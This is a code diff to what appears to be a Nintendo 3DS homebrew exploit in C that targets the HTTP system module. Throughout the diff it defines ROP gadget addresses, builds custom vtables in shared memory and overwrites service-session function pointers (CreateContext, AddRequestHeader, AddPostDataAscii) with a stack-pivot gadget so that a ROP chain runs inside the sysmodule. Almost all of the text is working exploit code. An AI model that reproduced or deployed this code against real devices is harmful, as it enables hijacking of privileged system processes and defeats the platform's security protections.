@@ -7,6 +7,9 @@
 #include <unistd.h>
 #include <3ds.h>
 
+extern vu32 *httpheap_sharedmem;
+extern vu32 *ropvmem_sharedmem;
+
 extern u8 *http_codebin_buf;
 extern u32 *http_codebin_buf32;
 extern u32 http_codebin_size;
@@ -63,10 +66,11 @@ u32 ROP_http_context_getctxptr = 0x0010b8d8;//inr0=_this inr1=contexthandle
 u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 
 u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
-u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the context-session.
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
+
+u32 ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE = 0x108;//Size of the vtable for the objptr from httpc_cmdhandler *(_this+16).
 
 static u32 ropvmem_base = 0x0f000000;
 u32 ropvmem_size = 0x4000;
@@ -328,6 +332,15 @@ void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 ad
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_sharedmem_create, params);
 }
 
+u32 memalloc_ropvmem_dataheap(u32 *curptr, u32 **sharedmem_ptr, u32 size)
+{
+	*curptr-= size;
+
+	*sharedmem_ptr = (u32*)&ropvmem_sharedmem[((*curptr) - ropvmem_base) >> 2];
+
+	return *curptr;
+}
+
 Result init_hax_sharedmem(u32 *tmpbuf)
 {
 	u32 sharedmembase = 0x10006000;
@@ -499,7 +512,7 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	return 0;
 }
 
-Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_sharedmem)
+Result setuphaxx_httpheap_sharedmem()
 {
 	u32 pos;
 
@@ -522,10 +535,18 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 
 	u32 params[7] = {0};
 
-	condcallfunc_objaddr = ropvmem_base + ropvmem_size - 0x8;
+	u32 mainrop_endaddr;
 
-	__custom_mainservsession_vtable = condcallfunc_objaddr - ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE;
-	__custom_contextservsession_vtable = __custom_mainservsession_vtable - ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE;
+	u32 *condcallfunc_objaddr_sharedmemptr = NULL;
+	u32 *__custom_mainservsession_vtable_sharedmemptr = NULL;
+	u32 *__custom_contextservsession_vtable_sharedmemptr = NULL;
+
+	mainrop_endaddr = ropvmem_base + ropvmem_size;
+
+	condcallfunc_objaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &condcallfunc_objaddr_sharedmemptr, 0x8);
+
+	__custom_mainservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_mainservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+	__custom_contextservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_contextservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
 
 	//Setup the ROP-chain used by the vtable funcptrs from the end of this function.
 
@@ -642,32 +663,32 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, vu32 *ropvmem_shar
 	}
 
 	ropvaddr = ropvaddr - ropoffset + bakropoff;
-	if(ropvaddr > __custom_contextservsession_vtable)
+	if(ropvaddr > mainrop_endaddr)
 	{
-		printf("The backup version of the main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - __custom_contextservsession_vtable));
+		printf("The backup version of the main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - mainrop_endaddr));
 		return -2;
 	}
 
 	//Setup the object used by ropgen_cond_callfunc().
-	ptr = (u32*)&ropvmem_sharedmem[(condcallfunc_objaddr - ropvmem_base) >> 2];
+	ptr = condcallfunc_objaddr_sharedmemptr;
 	ptr[0] = condcallfunc_objaddr + 0x4 - 0xcc;//Setup the vtable ptr so that the funcptr is loaded from the below word.
 	ptr[1] = ROP_POPPC;
 
 	//Setup the custom vtable for main serv session.
-	ptr = (u32*)&ropvmem_sharedmem[(__custom_mainservsession_vtable - ropvmem_base) >> 2];
-	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
+	ptr = __custom_mainservsession_vtable_sharedmemptr;
+	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
 	ptr[0x8>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//Overwrite the vtable funcptr for CreateContext.
 
 	//Setup the custom vtable for context-session.
-	ptr = (u32*)&ropvmem_sharedmem[(__custom_contextservsession_vtable - ropvmem_base) >> 2];
-	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE);
+	ptr = __custom_contextservsession_vtable_sharedmemptr;
+	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
 	//Overwrite the vtable funcptrs.
 	//ptr[0x6c>>2] = 0x80808080;//ReceiveDataTimeout. This is called from the same seperate thread as CloseContext.
 	ptr[0x80>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddRequestHeader. This is called from the main-thread.
 	ptr[0x84>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddPostDataAscii. This is called from the main-thread.
 	//ptr[0xa8>>2] = ROP_MOVR0_VAL0_BXLR;//SendPOSTDataRawTimeout. This is called from the same seperate thread as CloseContext. With this HTTPC:SendPOSTDataRawTimeout will just return 0 without doing anything, hence the specified POST data will not be uploaded.
 
-	//Overwrite every vtable ptr with the target value with the custom one.
+	//Overwrite every main-serv-sesssion httpc_cmdhandler object *(_this+16) vtable ptr with the custom one.
 
 	for(pos=0; pos<(httpheap_size>>2); pos++)
 	{
